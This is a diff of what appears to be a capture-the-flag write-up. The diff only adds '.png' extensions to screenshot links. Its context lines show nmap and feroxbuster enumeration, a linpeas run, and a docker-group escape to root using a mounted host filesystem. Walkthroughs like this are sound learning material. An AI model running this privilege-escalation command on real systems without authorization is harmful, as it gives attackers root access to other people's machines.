@@ -13,7 +13,7 @@ nmap -p- <ip>
 This revealed additional ports. I then ran a targeted scan:
 
 nmap -sC -sV -p 21,22,8081,31331 <ip>
-![nmap](images/Screenshot21)
+![nmap](images/Screenshot21.png)
 Now we have a clearer picture of the attack surface.
 
 <h3>Initial Enumeration</h3>
@@ -48,12 +48,12 @@ I ran feroxbuster again:
 feroxbuster -u http://<ip>:31331 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 
 While the scan was running, I checked robots.txt and found:
-![robots](images/Screenshot24)
+![robots](images/Screenshot24.png)
 
 /index.html
 /what.html
 /partners.html
-![robots](images/Screenshot25)
+![robots](images/Screenshot25.png)
 <h3>JavaScript Analysis</h3>
 
 While inspecting the source code of the partners page, I found:
@@ -123,7 +123,7 @@ chmod +x linpeas.sh
 ./linpeas.sh
 
 I discovered the user is part of the <em><strong>docker group</strong></em>.
-![esc](images/Screenshot38)
+![esc](images/Screenshot38.png)
 <h4>Docker Exploitation</h4>
 
 From <em><strong>GTFOBins</strong></em>, I found:
@@ -141,4 +141,4 @@ docker run -v /:/mnt --rm -it bash chroot /mnt sh
 <h3>Root Access</h3>
 
 This gave me a root shell.
-![root](images/Screenshot40)
+![root](images/Screenshot40.png)
